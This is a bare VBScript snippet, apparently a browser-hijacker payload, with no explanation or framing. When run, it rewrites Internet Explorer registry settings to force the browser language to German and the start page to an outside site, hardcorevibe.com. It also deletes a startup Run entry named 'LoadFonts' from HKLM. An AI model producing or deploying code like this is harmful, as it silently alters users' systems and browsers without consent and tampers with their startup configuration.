Set W = Wscript.CreateObject("Wscript.Shell")
W.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\International\AcceptLanguage","de"
W.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.hardcorevibe.com/index2.shtml"
W.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\LoadFonts"
